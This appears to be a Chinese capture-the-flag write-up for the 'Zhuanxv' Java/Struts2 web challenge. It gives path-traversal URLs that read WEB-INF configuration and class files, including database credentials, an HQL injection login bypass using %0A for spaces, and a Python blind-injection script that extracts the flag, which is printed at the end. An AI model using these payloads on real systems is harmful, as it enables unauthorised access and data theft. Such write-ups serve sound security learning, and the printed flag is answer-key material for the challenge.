# Zhuanxv

## 思路分析

> 源码没啥东西,发现是java写的网站(Wappalyzer).开始扫目录,发现一个list路径,访问会跳转到一个登陆页面.万能密码,爆破无果,查看css,有一个文件是通过http://61.147.171.105:61333/loadimage?fileName=web_login_bg.jpg来加载的.猜测这里可能存在目录跨越漏洞.

> 访问http://61.147.171.105:61333/loadimage?fileName=../../WEB-INF/web.xml获取配置文件.为什么就知道xml位于那个位置,这是因为写java web项目的时候有层级要求,基本上都是按照规范来写的.可以发现网站是用struts2框架写的.

> struts.xml是struts2的核心配置文件,该文件主要负责管理应用中的Action映射,以及该Action包含的Result定义等,因此我们需要读取struts.xml看看,访问http://61.147.171.105:61333/loadimage?fileName=../../WEB-INF/classes/struts.xml

> 可以看到有很多class,这就是所谓的映射文件,如访问loadimage路径时候,会去找字节码com.cuitctf.action.DownloadAction文件去加载内容,一一构造payload:

```
http://61.147.171.105:61333/loadimage?fileName=../../WEB-INF/classes/com/cuitctf/action/UserLoginAction.class
http://61.147.171.105:61333/loadimage?fileName=../../WEB-INF/classes/com/cuitctf/action/DownloadAction.class
http://61.147.171.105:61333/loadimage?fileName=../../WEB-INF/classes/com/cuitctf/action/AdminAction.class
http://61.147.171.105:61333/loadimage?fileName=../../WEB-INF/classes/com/cuitctf/util/UserOAuth.class
```

> 下载后修改后缀,再使用jadx工具得到源代码.发现UserLoginAction.class反编译出来的内容与登录页面最为相关,中引入了重要的几个包,因此构造payload,拿到源码:

```
http://61.147.171.105:61333/loadimage?fileName=../../WEB-INF/classes/com/cuitctf/po/User.class
http://61.147.171.105:61333/loadimage?fileName=../../WEB-INF/classes/com/cuitctf/service/UserService.class
http://61.147.171.105:61333/loadimage?fileName=../../WEB-INF/classes/com/cuitctf/util/InitApplicationContext.class
```

> User.class反编译后是一个Bean文件,UserLoginAction.class反编译后是登录验证逻辑文件,InitApplicationContext.class反编译后是类加载器文件.可以看到,加载应用的xml配置文件为applicationContext.xml,该文件一般是项目的启动配置文件,包括数据库等,同样构造payload,如下:

```
http://61.147.171.105:61333/loadimage?fileName=../../WEB-INF/classes/applicationContext.xml
```

> 其中暴露了使用的数据库,数据库账号密码,且其中包含了user.hbm.xml等配置文件,同样将其下载出来:

```
http://61.147.171.105:61333/loadimage?fileName=../../WEB-INF/classes/user.hbm.xml
http://61.147.171.105:61333/loadimage?fileName=../../WEB-INF/classes/com/cuitctf/service/impl/UserServiceImpl.class
http://61.147.171.105:61333/loadimage?fileName=../../WEB-INF/classes/com/cuitctf/dao/impl/UserDaoImpl.class
```

> 可以看到user.hbm.xml暗示了flag在数据库中位置,UserServiceImpl.class反编译后,是对登录信息进行了过滤,UserDaoImpl.class反编译后,是对登录的sql查找

> 上面图的sql语句使用HSQL,什么是HSQL,参考这里:https://www.cnblogs.com/fengyouheng/p/11013013.html.因此构造登录账号密码:

```
from User where name ='admin' or '1'>'0' or name like 'admin' and password = '" + password + "'
```

> UserServiceImpl.class反编译后代码中是对空格进行了过滤,而sql中对回车自动过滤, 因此我们可以将空格字符换成%0A（ascii码表示换行符）.于是使用hackbar进行翻译,得到新的注入sql的payload:

```
admin'%0Aor%0A'1'>'0'%0Aor%0Aname%0Alike%0A'admin
```

## payload

```
import requests

req = requests.session()
 
flag = ''
for i in range(1, 50):
    p = ''
    for j in range(1, 255):
        # (select ascii(substr(id, "+str(i)+", 1)) from Flag where id < 2) < '
        payload = "(select%0Aascii(substr(id," + str(i) + ",1))%0Afrom%0AFlag%0Awhere%0Aid<2)<'" + str(j) + "'"
        #print payload
        url = "http://61.147.171.105:61333/zhuanxvlogin?user.name=admin'%0Aor%0A" + payload + "%0Aor%0Aname%0Alike%0A'admin&user.password=1"
        response = req.get(url)
        if len(response.text) > 20000 and p != '':
            flag += p
            print(i, flag)
            break
        p = chr(j)
```

## flag

> sctf{C46E250926A2DFFD831975396222B08E}

## 参考

> https://blog.csdn.net/l8947943/article/details/122372989
> https://www.cnblogs.com/fengyouheng/p/11013013.html